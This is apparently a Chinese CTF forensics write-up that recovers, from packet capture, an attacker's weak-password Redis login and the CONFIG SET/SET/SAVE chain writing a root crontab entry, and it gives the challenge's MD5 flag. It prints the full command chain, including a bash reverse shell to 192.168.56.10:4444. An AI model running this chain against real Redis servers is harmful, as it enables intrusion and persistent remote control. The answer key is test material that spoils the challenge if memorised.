## 简介
题目说明：攻击者通过弱口令成功连接 Redis，随后利用 Redis 写入计划任务实现持久化控制。参赛者需要从流量中还原攻击者写入计划任务的完整命令，并对该完整命令原文进行 MD5 计算，结果按 `flag{md5值}` 格式提交。

flag{dab878bc93428e02994600d31b8a146f}

## 解题过程
打开 `redis_crontab.pcap` 后，使用过滤条件 `tcp.port == 6379`，可以快速定位 Redis 相关流量。

跟踪 TCP Stream，可以直接看到攻击者从 `172.16.10.50` 连接到 `172.16.10.20:6379`，并使用弱口令完成认证：

```text
AUTH redis123
```

继续查看同一条会话，可以看到完整利用链如下：

```text
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET cron_key "\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'\n"
SAVE
```

其中真正写入计划任务的完整命令为：

```bash
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

对该完整命令原文计算 MD5：

```bash
echo -n "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'" | md5sum
```

得到：

```text
dab878bc93428e02994600d31b8a146f
```

因此最终答案为：

```text
flag{dab878bc93428e02994600d31b8a146f}
```
